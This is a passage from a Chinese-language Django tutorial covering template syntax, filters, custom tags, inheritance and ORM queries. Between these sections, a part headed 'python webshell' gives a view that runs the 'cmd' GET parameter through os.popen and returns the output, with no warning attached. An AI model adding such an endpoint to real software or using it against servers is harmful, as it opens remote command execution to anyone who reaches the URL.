&lt;p&gt;&#x4F20;&#x7C7B;&#x540D;&#x7684;&#x65F6;&#x5019;&#x4E5F;&#x4F1A;&#x81EA;&#x52A8;&#x52A0;&#x62EC;&#x53F7;&#x8C03;&#x7528;(&#x5B9E;&#x4F8B;&#x5316;){[ MyClass ]}&lt;/p&gt;
&lt;p&gt;&#x5185;&#x90E8;&#x80FD;&#x591F;&#x81EA;&#x52A8;&#x5224;&#x65AD;&#x51FA;&#x5F53;&#x524D;&#x7684;&#x53D8;&#x91CF;&#x540D;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x52A0;&#x62EC;&#x53F7;&#x8C03;&#x7528; &#x5982;&#x679C;&#x53EF;&#x4EE5;&#x5C31;&#x4F1A;&#x81EA;&#x52A8;&#x6267;&#x884C;  &#x9488;&#x5BF9;&#x7684;&#x662F;&#x51FD;&#x6570;&#x540D;&#x548C;&#x7C7B;&#x540D;&lt;/p&gt;
&lt;p&gt;{[ obj ]}&lt;/p&gt;
&lt;p&gt;{[ obj.get_self ]}&lt;/p&gt;
&lt;p&gt;{[ obj.get_func ]}&lt;/p&gt;
&lt;p&gt;{[ obj.get_class ]}&lt;/p&gt;


# django&#x6A21;&#x7248;&#x8BED;&#x6CD5;&#x7684;&#x53D6;&#x503C; &#x662F;&#x56FA;&#x5B9A;&#x7684;&#x683C;&#x5F0F; &#x53EA;&#x80FD;&#x91C7;&#x7528;&#x201C;&#x53E5;&#x70B9;&#x7B26;&#x201D; .
&lt;p&gt;{[ d.username ]}&lt;/p&gt;
&lt;p&gt;{[ l.0 ]}&lt;/p&gt;
&lt;p&gt;{[ d.hobby.3.info ]}&lt;/p&gt;
# &#x5373;&#x53EF;&#x4EE5;&#x70B9;&#x952E;&#x4E5F;&#x53EF;&#x4EE5;&#x70B9;&#x7D22;&#x5F15; &#x8FD8;&#x53EF;&#x4EE5;&#x4E24;&#x8005;&#x6DF7;&#x7528;
</code></pre>
<h4 id="&#x8FC7;&#x6EE4;&#x5668;&#x8FC7;&#x6EE4;&#x5668;&#x53EA;&#x80FD;&#x6700;&#x591A;&#x6709;&#x4E24;&#x4E2A;&#x53C2;&#x6570;">&#x8FC7;&#x6EE4;&#x5668;(&#x8FC7;&#x6EE4;&#x5668;&#x53EA;&#x80FD;&#x6700;&#x591A;&#x6709;&#x4E24;&#x4E2A;&#x53C2;&#x6570;)</h4>
<pre><code class="lang-python"># &#x8FC7;&#x6EE4;&#x5668;&#x5C31;&#x7C7B;&#x4F3C;&#x4E8E;&#x662F;&#x6A21;&#x7248;&#x8BED;&#x6CD5;&#x5185;&#x7F6E;&#x7684; &#x5185;&#x7F6E;&#x65B9;&#x6CD5;
# django&#x5185;&#x7F6E;&#x6709;60&#x591A;&#x4E2A;&#x8FC7;&#x6EE4;&#x5668; &#x6211;&#x4EEC;&#x4E0D;&#x9700;&#x8981;&#x5B66;&#x8FD9;&#x4E48;&#x591A; &#x4E86;&#x89E3;10&#x4E2A;&#x5DE6;&#x53F3;&#x5C31;&#x5DEE;&#x4E0D;&#x591A;&#x4E86; &#x540E;&#x9762;&#x78B0;&#x5230;&#x4E86;&#x518D;&#x53BB;&#x8BB0;&#x5FC6;



# &#x57FA;&#x672C;&#x8BED;&#x6CD5;
{[&#x6570;&#x636E;|&#x8FC7;&#x6EE4;&#x5668;:&#x53C2;&#x6570;]}

# &#x8F6C;&#x4E49;
# &#x524D;&#x7AEF;
    |safe
# &#x540E;&#x7AEF;
    from django.utils.safestring import mark_safe
  res = mark_safe(&apos;&lt;h1&gt;&#x65B0;&#x65B0;&lt;/h1&gt;&apos;)
&quot;&quot;&quot;
&#x4EE5;&#x540E;&#x4F60;&#x5728;&#x5168;&#x6808;&#x9879;&#x76EE;&#x7684;&#x65F6;&#x5019; &#x524D;&#x7AEF;&#x4EE3;&#x7801;&#x4E0D;&#x4E00;&#x5B9A;&#x975E;&#x8981;&#x5728;&#x524D;&#x7AEF;&#x9875;&#x9762;&#x4E66;&#x5199;
&#x4E5F;&#x53EF;&#x4EE5;&#x73B0;&#x5728;&#x5148;&#x5728;&#x540E;&#x7AEF;&#x5199;&#x597D; &#x7136;&#x540E;&#x4F20;&#x9012;&#x7ED9;&#x524D;&#x7AEF;&#x9875;&#x9762;
&quot;&quot;&quot;


&lt;h1&gt;&#x8FC7;&#x6EE4;&#x5668;&lt;/h1&gt;
&lt;p&gt;&#x7EDF;&#x8BA1;&#x957F;&#x5EA6;:{[ s|length ]}&lt;/p&gt;
&lt;p&gt;&#x9ED8;&#x8BA4;&#x503C;(&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5E03;&#x5C14;&#x503C;&#x662F;True&#x5C31;&#x5C55;&#x793A;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x7684;&#x503C;&#x5426;&#x5728;&#x5C55;&#x793A;&#x5192;&#x53F7;&#x540E;&#x9762;&#x7684;&#x503C;):{[ b|default:&apos;&#x5565;&#x4E5F;&#x4E0D;&#x662F;&apos; ]}&lt;/p&gt;
&lt;p&gt;&#x6587;&#x4EF6;&#x5927;&#x5C0F;:{[ file_size|filesizeformat ]}&lt;/p&gt;
&lt;p&gt;&#x65E5;&#x671F;&#x683C;&#x5F0F;&#x5316;:{[ current_time|date:&apos;Y-m-d H:i:s&apos; ]}&lt;/p&gt;
&lt;p&gt;&#x5207;&#x7247;&#x64CD;&#x4F5C;(&#x652F;&#x6301;&#x6B65;&#x957F;):{[ l|slice:&apos;0:4:2&apos; ]}&lt;/p&gt;
&lt;p&gt;&#x5207;&#x53D6;&#x5B57;&#x7B26;(&#x5305;&#x542B;&#x4E09;&#x4E2A;&#x70B9;):{[ info|truncatechars:9 ]}&lt;/p&gt;
&lt;p&gt;&#x5207;&#x53D6;&#x5355;&#x8BCD;(&#x4E0D;&#x5305;&#x542B;&#x4E09;&#x4E2A;&#x70B9; &#x6309;&#x7167;&#x7A7A;&#x683C;&#x5207;):{[ egl|truncatewords:9 ]}&lt;/p&gt;
&lt;p&gt;&#x5207;&#x53D6;&#x5355;&#x8BCD;(&#x4E0D;&#x5305;&#x542B;&#x4E09;&#x4E2A;&#x70B9; &#x6309;&#x7167;&#x7A7A;&#x683C;&#x5207;):{[ info|truncatewords:9 ]}&lt;/p&gt;
&lt;p&gt;&#x79FB;&#x9664;&#x7279;&#x5B9A;&#x7684;&#x5B57;&#x7B26;:{[ msg|cut:&apos; &apos; ]}&lt;/p&gt;
&lt;p&gt;&#x62FC;&#x63A5;&#x64CD;&#x4F5C;:{[ l|join:&apos;$&apos; ]}&lt;/p&gt;
&lt;p&gt;&#x62FC;&#x63A5;&#x64CD;&#x4F5C;(&#x52A0;&#x6CD5;):{[ n|add:10 ]}&lt;/p&gt;
&lt;p&gt;&#x62FC;&#x63A5;&#x64CD;&#x4F5C;(&#x52A0;&#x6CD5;):{[ s|add:msg ]}&lt;/p&gt;
&lt;p&gt;&#x8F6C;&#x4E49;:{[ hhh|safe ]}&lt;/p&gt;
&lt;p&gt;&#x8F6C;&#x4E49;:{[ sss|safe ]}&lt;/p&gt;
&lt;p&gt;&#x8F6C;&#x4E49;:{[ res ]}&lt;/p&gt;
</code></pre>
<h4 id="&#x6807;&#x7B7E;">&#x6807;&#x7B7E;</h4>
<pre><code class="lang-python"># for&#x5FAA;&#x73AF;
    {# for foo in l #}
    &lt;p&gt;{[ forloop ]}&lt;/p&gt;
    &lt;p&gt;{[ foo ]}&lt;/p&gt;  &#x4E00;&#x4E2A;&#x4E2A;&#x5143;&#x7D20;
    {# endfor #}
  {&apos;parentloop&apos;: {}, &apos;counter0&apos;: 0, &apos;counter&apos;: 1, &apos;revcounter&apos;: 6, &apos;revcounter0&apos;: 5, &apos;first&apos;: True, &apos;last&apos;: False}

# if&#x5224;&#x65AD;
{# if b #}
    &lt;p&gt;baby&lt;/p&gt;
{# elif s#}
    &lt;p&gt;&#x90FD;&#x6765;&#x628A;&lt;/p&gt;
{# else #}
    &lt;p&gt;&#x8001;baby&lt;/p&gt;
{# endif #}


# for&#x4E0E;if&#x6DF7;&#x5408;&#x4F7F;&#x7528;
{# for foo in lll #}
    {# if forloop.first #}
        &lt;p&gt;&#x8FD9;&#x662F;&#x6211;&#x7684;&#x7B2C;&#x4E00;&#x6B21;&lt;/p&gt;
    {# elif forloop.last #}
        &lt;p&gt;&#x8FD9;&#x662F;&#x6700;&#x540E;&#x4E00;&#x6B21;&#x554A;&lt;/p&gt;
    {# else #}
        &lt;p&gt;{[ foo ]}&lt;/p&gt;
    {# endif #}
    {# empty #}
        &lt;p&gt;for&#x5FAA;&#x73AF;&#x7684;&#x53EF;&#x8FED;&#x4EE3;&#x5BF9;&#x8C61;&#x5185;&#x90E8;&#x6CA1;&#x6709;&#x5143;&#x7D20; &#x6839;&#x672C;&#x6CA1;&#x6CD5;&#x5FAA;&#x73AF;&lt;/p&gt;
{# endfor #}



# &#x5904;&#x7406;&#x5B57;&#x5178;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;
{# for foo in d.keys #}
    &lt;p&gt;{[ foo ]}&lt;/p&gt;
{# endfor #}
{# for foo in d.values #}
    &lt;p&gt;{[ foo ]}&lt;/p&gt;
{# endfor #}
{# for foo in d.items #}
    &lt;p&gt;{[ foo ]}&lt;/p&gt;
{# endfor #}


# with&#x8D77;&#x522B;&#x540D;
{# with d.hobby.3.info as nb  #}
    &lt;p&gt;{[ nb ]}&lt;/p&gt;
    &#x5728;with&#x8BED;&#x6CD5;&#x5185;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;as&#x540E;&#x9762;&#x7684;&#x522B;&#x540D;&#x5FEB;&#x901F;&#x7684;&#x4F7F;&#x7528;&#x5230;&#x524D;&#x9762;&#x975E;&#x5E38;&#x590D;&#x6742;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x7684;&#x65B9;&#x5F0F;
    &lt;p&gt;{[ d.hobby.3.info ]}&lt;/p&gt;
{# endwith #}
</code></pre>
<h4 id="&#x81EA;&#x5B9A;&#x4E49;&#x8FC7;&#x6EE4;&#x5668;&#x3001;&#x6807;&#x7B7E;&#x3001;inclusiontag">&#x81EA;&#x5B9A;&#x4E49;&#x8FC7;&#x6EE4;&#x5668;&#x3001;&#x6807;&#x7B7E;&#x3001;inclusion_tag</h4>
<pre><code class="lang-python">&quot;&quot;&quot;
&#x5148;&#x4E09;&#x6B65;&#x8D70;
    1.&#x5728;&#x5E94;&#x7528;&#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x5B57;&#x201D;&#x5FC5;&#x987B;&#x201C;&#x53EB;templatetags&#x6587;&#x4EF6;&#x5939;
    2.&#x5728;&#x8BE5;&#x6587;&#x4EF6;&#x5939;&#x5185;&#x521B;&#x5EFA;&#x201C;&#x4EFB;&#x610F;&#x201D;&#x540D;&#x79F0;&#x7684;py&#x6587;&#x4EF6; eg:mytag.py
    3.&#x5728;&#x8BE5;py&#x6587;&#x4EF6;&#x5185;&quot;&#x5FC5;&#x987B;&quot;&#x5148;&#x4E66;&#x5199;&#x4E0B;&#x9762;&#x4E24;&#x53E5;&#x8BDD;(&#x5355;&#x8BCD;&#x4E00;&#x4E2A;&#x90FD;&#x4E0D;&#x80FD;&#x9519;)
        from django import template

        register = template.Library()
&quot;&quot;&quot;

# &#x81EA;&#x5B9A;&#x4E49;&#x8FC7;&#x6EE4;&#x5668;
@register.filter(name=&apos;baby&apos;)
def my_sum(v1, v2):
    return v1 + v2
# &#x4F7F;&#x7528;
{# load mytag #}
&lt;p&gt;{[ n|baby:666 ]}&lt;/p&gt;


# &#x81EA;&#x5B9A;&#x4E49;&#x6807;&#x7B7E;(&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;)            &#x7C7B;&#x4F3C;&#x4E8E;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;
@register.simple_tag(name=&apos;plus&apos;)
def index(a,b,c,d):
    return &apos;%s-%s-%s-%s&apos;%(a,b,c,d)
# &#x4F7F;&#x7528;
&#x6807;&#x7B7E;&#x591A;&#x4E2A;&#x53C2;&#x6570;&#x5F7C;&#x6B64;&#x4E4B;&#x95F4;&#x7A7A;&#x683C;&#x9694;&#x5F00;
&lt;p&gt;{# plus &apos;jason&apos; 123 123 123 #}&lt;/p&gt;


# &#x81EA;&#x5B9A;&#x4E49;inclusion_tag
&quot;&quot;&quot;
&#x5185;&#x90E8;&#x539F;&#x7406;
    &#x5148;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5; 
    &#x5728;&#x9875;&#x9762;&#x4E0A;&#x8C03;&#x7528;&#x8BE5;&#x65B9;&#x6CD5; &#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x4F20;&#x503C;
    &#x8BE5;&#x65B9;&#x6CD5;&#x4F1A;&#x751F;&#x6210;&#x4E00;&#x4E9B;&#x6570;&#x636E;&#x7136;&#x540E;&#x4F20;&#x9012;&#x7ED9;&#x4E00;&#x4E2A;html&#x9875;&#x9762;
    &#x4E4B;&#x540E;&#x5C06;&#x6E32;&#x67D3;&#x597D;&#x7684;&#x7ED3;&#x679C;&#x653E;&#x5230;&#x8C03;&#x7528;&#x7684;&#x4F4D;&#x7F6E;
&quot;&quot;&quot;
@register.inclusion_tag(&apos;left_menu.html&apos;)
def left(n):
    data = [&apos;&#x7B2C;{}&#x9879;&apos;.format(i) for i in range(n)]
    # &#x7B2C;&#x4E00;&#x79CD;
    # return {&apos;data&apos;:data}  # &#x5C06;data&#x4F20;&#x9012;&#x7ED9;left_menu.html
    # &#x7B2C;&#x4E8C;&#x79CD;
    return locals()  # &#x5C06;data&#x4F20;&#x9012;&#x7ED9;left_menu.html

{# left 5 #}
# &#x603B;&#x7ED3;:&#x5F53;html&#x9875;&#x9762;&#x67D0;&#x4E00;&#x4E2A;&#x5730;&#x65B9;&#x7684;&#x9875;&#x9762;&#x9700;&#x8981;&#x4F20;&#x53C2;&#x6570;&#x624D;&#x80FD;&#x591F;&#x52A8;&#x6001;&#x7684;&#x6E32;&#x67D3;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x591A;&#x4E2A;&#x9875;&#x9762;&#x4E0A;&#x90FD;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x5230;&#x8BE5;&#x5C40;&#x90E8; &#x90A3;&#x4E48;&#x5C31;&#x8003;&#x8651;&#x5C06;&#x8BE5;&#x5C40;&#x90E8;&#x9875;&#x9762;&#x505A;&#x6210;inclusion_tag&#x5F62;&#x5F0F;
(&#x5728;&#x8BB2;bbs&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x4F7F;&#x7528;&#x5230;)
</code></pre>
<p><a href="https://imgse.com/i/p93t4yT" target="_blank"><img src="https://s1.ax1x.com/2023/04/30/p93t4yT.png" alt="p93t4yT.png"></a></p>
<p><a href="https://imgse.com/i/p93tgFs" target="_blank"><img src="https://s1.ax1x.com/2023/04/30/p93tgFs.png" alt="p93tgFs.png"></a></p>
<h4 id="&#x6A21;&#x7248;&#x7684;&#x7EE7;&#x627F;">&#x6A21;&#x7248;&#x7684;&#x7EE7;&#x627F;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x4F60;&#x4EEC;&#x6709;&#x6CA1;&#x6709;&#x89C1;&#x8FC7;&#x4E00;&#x4E9B;&#x7F51;&#x7AD9;
    &#x8FD9;&#x4E9B;&#x7F51;&#x7AD9;&#x9875;&#x9762;&#x6574;&#x4F53;&#x90FD;&#x5927;&#x5DEE;&#x4E0D;&#x5DEE; &#x53EA;&#x662F;&#x67D0;&#x4E00;&#x4E9B;&#x5C40;&#x90E8;&#x5728;&#x505A;&#x53D8;&#x5316;    
&quot;&quot;&quot;</span>
<span class="hljs-comment"># &#x6A21;&#x7248;&#x7684;&#x7EE7;&#x627F; &#x4F60;&#x81EA;&#x5DF1;&#x5148;&#x9009;&#x597D;&#x4E00;&#x4E2A;&#x4F60;&#x8981;&#x60F3;&#x7EE7;&#x627F;&#x7684;&#x6A21;&#x7248;&#x9875;&#x9762;</span>
{<span class="hljs-comment"># extends &apos;home.html&apos; #}</span>

<span class="hljs-comment"># &#x7EE7;&#x627F;&#x4E86;&#x4E4B;&#x540E;&#x5B50;&#x9875;&#x9762;&#x8DDF;&#x6A21;&#x7248;&#x9875;&#x9762;&#x957F;&#x7684;&#x662F;&#x4E00;&#x6A21;&#x4E00;&#x6837;&#x7684; &#x4F60;&#x9700;&#x8981;&#x5728;&#x6A21;&#x7248;&#x9875;&#x9762;&#x4E0A;&#x63D0;&#x524D;&#x5212;&#x5B9A;&#x53EF;&#x4EE5;&#x88AB;&#x4FEE;&#x6539;&#x7684;&#x533A;&#x57DF;</span>
{<span class="hljs-comment"># block content #}</span>
    &#x6A21;&#x7248;&#x5185;&#x5BB9;
{<span class="hljs-comment"># endblock #}</span>

<span class="hljs-comment"># &#x5B50;&#x9875;&#x9762;&#x5C31;&#x53EF;&#x4EE5;&#x58F0;&#x660E;&#x60F3;&#x8981;&#x4FEE;&#x6539;&#x54EA;&#x5757;&#x5212;&#x5B9A;&#x4E86;&#x7684;&#x533A;&#x57DF;</span>
{<span class="hljs-comment"># block content #}</span>
    &#x5B50;&#x9875;&#x9762;&#x5185;&#x5BB9;    
{<span class="hljs-comment"># endblock #}</span>


<span class="hljs-comment"># &#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x6A21;&#x7248;&#x9875;&#x9762;&#x4E0A;&#x5E94;&#x8BE5;&#x81F3;&#x5C11;&#x6709;&#x4E09;&#x5757;&#x53EF;&#x4EE5;&#x88AB;&#x4FEE;&#x6539;&#x7684;&#x533A;&#x57DF;</span>
      <span class="hljs-number">1.</span>css&#x533A;&#x57DF;
      <span class="hljs-number">2.</span>html&#x533A;&#x57DF;
      <span class="hljs-number">3.j</span>s&#x533A;&#x57DF;
  {<span class="hljs-comment"># block css #}</span>

    {<span class="hljs-comment"># endblock #}</span>

  {<span class="hljs-comment"># block content #}</span>

    {<span class="hljs-comment"># endblock #}</span>

  {<span class="hljs-comment"># block js #}</span>

    {<span class="hljs-comment"># endblock #}</span>
  <span class="hljs-comment"># &#x6BCF;&#x4E00;&#x4E2A;&#x5B50;&#x9875;&#x9762;&#x5C31;&#x90FD;&#x53EF;&#x4EE5;&#x6709;&#x81EA;&#x5DF1;&#x72EC;&#x6709;&#x7684;css&#x4EE3;&#x7801; html&#x4EE3;&#x7801; js&#x4EE3;&#x7801;</span>

<span class="hljs-string">&quot;&quot;&quot;
&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B; &#x6A21;&#x7248;&#x7684;&#x9875;&#x9762;&#x4E0A;&#x5212;&#x5B9A;&#x7684;&#x533A;&#x57DF;&#x8D8A;&#x591A; &#x90A3;&#x4E48;&#x8BE5;&#x6A21;&#x7248;&#x7684;&#x6269;&#x5C55;&#x6027;&#x5C31;&#x8D8A;&#x9AD8;
&#x4F46;&#x662F;&#x5982;&#x679C;&#x592A;&#x591A; &#x90A3;&#x8FD8;&#x4E0D;&#x5982;&#x81EA;&#x5DF1;&#x76F4;&#x63A5;&#x5199;
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x6A21;&#x7248;&#x7684;&#x5BFC;&#x5165;&#x5305;&#x542B;">&#x6A21;&#x7248;&#x7684;(&#x5BFC;&#x5165;)&#x5305;&#x542B;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x5C06;&#x9875;&#x9762;&#x7684;&#x67D0;&#x4E00;&#x4E2A;&#x5C40;&#x90E8;&#x5F53;&#x6210;&#x6A21;&#x5757;&#x7684;&#x5F62;&#x5F0F;
&#x54EA;&#x4E2A;&#x5730;&#x65B9;&#x9700;&#x8981;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5BFC;&#x5165;&#x4F7F;&#x7528;&#x5373;&#x53EF;
&quot;&quot;&quot;</span>
{<span class="hljs-comment"># include &apos;wasai.html&apos; #}</span>
</code></pre>
<h1 id=""> </h1>
<h4 id="python-webshell">python webshell</h4>
<p>urls.py</p>
<pre><code class="lang-python">path(<span class="hljs-string">&apos;shell/&apos;</span>, views.shell)
</code></pre>
<p>views.py</p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shell</span><span class="hljs-params">(request)</span>:</span>
    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&apos;GET&apos;</span>:
        cmd = request.GET.get(<span class="hljs-string">&quot;cmd&quot;</span>)
        p = os.popen(cmd)
        x = p.read()
        <span class="hljs-keyword">return</span> HttpResponse(x)
</code></pre>
<p><a href="https://imgse.com/i/p93txOO" target="_blank"><img src="https://s1.ax1x.com/2023/04/30/p93txOO.png" alt="p93txOO.png"></a></p>
<h4 id="&#x5355;&#x8868;&#x64CD;&#x4F5C;">&#x5355;&#x8868;&#x64CD;&#x4F5C;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># django&#x81EA;&#x5E26;&#x7684;sqlite3&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x65E5;&#x671F;&#x683C;&#x5F0F;&#x4E0D;&#x662F;&#x5F88;&#x654F;&#x611F; &#x5904;&#x7406;&#x7684;&#x65F6;&#x5019;&#x5BB9;&#x6613;&#x51FA;&#x9519;</span>
<span class="hljs-comment"># &#x589E;</span>
    <span class="hljs-comment"># res = models.User.objects.create(name=&apos;jason&apos;,age=18,register_time=&apos;2002-1-21&apos;)</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># import datetime</span>
    <span class="hljs-comment"># ctime = datetime.datetime.now()</span>
    <span class="hljs-comment"># user_obj = models.User(name=&apos;egon&apos;,age=84,register_time=ctime)</span>
    <span class="hljs-comment"># user_obj.save()</span>

    <span class="hljs-comment"># &#x5220;</span>
    <span class="hljs-comment"># res = models.User.objects.filter(pk=2).delete()</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    pk&#x4F1A;&#x81EA;&#x52A8;&#x67E5;&#x627E;&#x5230;&#x5F53;&#x524D;&#x8868;&#x7684;&#x4E3B;&#x952E;&#x5B57;&#x6BB5; &#x6307;&#x4EE3;&#x7684;&#x5C31;&#x662F;&#x5F53;&#x524D;&#x8868;&#x7684;&#x4E3B;&#x952E;&#x5B57;&#x6BB5;
    &#x7528;&#x4E86;pk&#x4E4B;&#x540E; &#x4F60;&#x5C31;&#x4E0D;&#x9700;&#x8981;&#x6307;&#x4EE3;&#x5F53;&#x524D;&#x8868;&#x7684;&#x4E3B;&#x952E;&#x5B57;&#x6BB5;&#x5230;&#x5E95;&#x53EB;&#x4EC0;&#x4E48;&#x4E86;
        uid
        pid
        sid
        ...
    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># user_obj = models.User.objects.filter(pk=1).first()</span>
    <span class="hljs-comment"># user_obj.delete()</span>

    <span class="hljs-comment"># &#x4FEE;&#x6539;</span>
    <span class="hljs-comment"># models.User.objects.filter(pk=4).update(name=&apos;egonDSB&apos;)</span>

    <span class="hljs-comment"># user_obj = models.User.objects.get(pk=4)</span>
    <span class="hljs-comment"># user_obj = models.User.objects.filter(pk=6)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    get&#x65B9;&#x6CD5;&#x8FD4;&#x56DE;&#x7684;&#x76F4;&#x63A5;&#x5C31;&#x662F;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5BF9;&#x8C61;
    &#x4F46;&#x662F;&#x8BE5;&#x65B9;&#x6CD5;&#x4E0D;&#x63A8;&#x8350;&#x4F7F;&#x7528;
        &#x4E00;&#x65E6;&#x6570;&#x636E;&#x4E0D;&#x5B58;&#x5728;&#x8BE5;&#x65B9;&#x6CD5;&#x4F1A;&#x76F4;&#x63A5;&#x62A5;&#x9519;
        &#x800C;filter&#x5219;&#x4E0D;&#x4F1A;
            &#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x7528;filter
    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># user_obj.name = &apos;egonPPP&apos;</span>
    <span class="hljs-comment"># user_obj.save()</span>
</code></pre>
<h4 id="&#x5FC5;&#x77E5;&#x5FC5;&#x4F1A;13&#x6761;">&#x5FC5;&#x77E5;&#x5FC5;&#x4F1A;13&#x6761;</h4>
<pre><code class="lang-python"><span class="hljs-comment"># &#x5FC5;&#x77E5;&#x5FC5;&#x4F1A;13&#x6761;</span>
    <span class="hljs-comment"># 1.all()  &#x67E5;&#x8BE2;&#x6240;&#x6709;&#x6570;&#x636E;</span>

    <span class="hljs-comment"># 2.filter()     &#x5E26;&#x6709;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6;&#x7684;&#x67E5;&#x8BE2;</span>
    <span class="hljs-comment"># 3.get()        &#x76F4;&#x63A5;&#x62FF;&#x6570;&#x636E;&#x5BF9;&#x8C61; &#x4F46;&#x662F;&#x6761;&#x4EF6;&#x4E0D;&#x5B58;&#x5728;&#x76F4;&#x63A5;&#x62A5;&#x9519;</span>
    <span class="hljs-comment"># 4.first()      &#x62FF;queryset&#x91CC;&#x9762;&#x7B2C;&#x4E00;&#x4E2A;&#x5143;&#x7D20;</span>
    <span class="hljs-comment"># res = models.User.objects.all().first()</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># 5.last()</span>
    <span class="hljs-comment"># res = models.User.objects.all().last()</span>
    <span class="hljs-comment"># print(res)</span>

    <span class="hljs-comment"># 6.values()  &#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x83B7;&#x53D6;&#x7684;&#x6570;&#x636E;&#x5B57;&#x6BB5;  select name,age from ...     &#x5217;&#x8868;&#x5957;&#x5B57;&#x5178;</span>
    <span class="hljs-comment"># res = models.User.objects.values(&apos;name&apos;,&apos;age&apos;)  # &lt;QuerySet [{&apos;name&apos;: &apos;jason&apos;, &apos;age&apos;: 18}, {&apos;name&apos;: &apos;egonPPP&apos;, &apos;age&apos;: 84}]&gt;</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># 7.values_list()  &#x5217;&#x8868;&#x5957;&#x5143;&#x7956;</span>
    <span class="hljs-comment"># res = models.User.objects.values_list(&apos;name&apos;,&apos;age&apos;)  # &lt;QuerySet [(&apos;jason&apos;, 18), (&apos;egonPPP&apos;, 84)]&gt;</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># &quot;&quot;&quot;</span>
    <span class="hljs-comment">#  # &#x67E5;&#x770B;&#x5185;&#x90E8;&#x5C01;&#x88C5;&#x7684;sql&#x8BED;&#x53E5;</span>
    <span class="hljs-comment">#  &#x4E0A;&#x8FF0;&#x67E5;&#x770B;sql&#x8BED;&#x53E5;&#x7684;&#x65B9;&#x5F0F;  &#x53EA;&#x80FD;&#x7528;&#x4E8E;queryset&#x5BF9;&#x8C61;</span>
    <span class="hljs-comment">#  &#x53EA;&#x6709;queryset&#x5BF9;&#x8C61;&#x624D;&#x80FD;&#x591F;&#x70B9;&#x51FB;query&#x67E5;&#x770B;&#x5185;&#x90E8;&#x7684;sql&#x8BED;&#x53E5;</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># &quot;&quot;&quot;</span>
    <span class="hljs-comment"># 8.distinct()  &#x53BB;&#x91CD;</span>
    <span class="hljs-comment"># res = models.User.objects.values(&apos;name&apos;,&apos;age&apos;).distinct()</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x53BB;&#x91CD;&#x4E00;&#x5B9A;&#x8981;&#x662F;&#x4E00;&#x6A21;&#x4E00;&#x6837;&#x7684;&#x6570;&#x636E;
    &#x5982;&#x679C;&#x5E26;&#x6709;&#x4E3B;&#x952E;&#x90A3;&#x4E48;&#x80AF;&#x5B9A;&#x4E0D;&#x4E00;&#x6837; &#x4F60;&#x5728;&#x5F80;&#x540E;&#x7684;&#x67E5;&#x8BE2;&#x4E2D;&#x4E00;&#x5B9A;&#x4E0D;&#x8981;&#x5FFD;&#x7565;&#x4E3B;&#x952E;

    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># 9.order_by()</span>
    <span class="hljs-comment"># res = models.User.objects.order_by(&apos;age&apos;)  # &#x9ED8;&#x8BA4;&#x5347;&#x5E8F;</span>
    <span class="hljs-comment"># res = models.User.objects.order_by(&apos;-age&apos;)  # &#x964D;&#x5E8F;</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># 10.reverse()  &#x53CD;&#x8F6C;&#x7684;&#x524D;&#x63D0;&#x662F; &#x6570;&#x636E;&#x5DF2;&#x7ECF;&#x6392;&#x8FC7;&#x5E8F;&#x4E86;  order_by()</span>
    <span class="hljs-comment"># res = models.User.objects.all()</span>
    <span class="hljs-comment"># res1 = models.User.objects.order_by(&apos;age&apos;).reverse()</span>
    <span class="hljs-comment"># print(res,res1)</span>

    <span class="hljs-comment"># 11.count()  &#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x6570;&#x636E;&#x7684;&#x4E2A;&#x6570;</span>
    <span class="hljs-comment"># res = models.User.objects.count()</span>
    <span class="hljs-comment"># print(res)</span>
    <span class="hljs-comment"># 12.exclude()  &#x6392;&#x9664;&#x5728;&#x5916;</span>
    <span class="hljs-comment"># res = models.User.objects.exclude(name=&apos;jason&apos;)</span>
    <span class="hljs-comment"># print(res)</span>

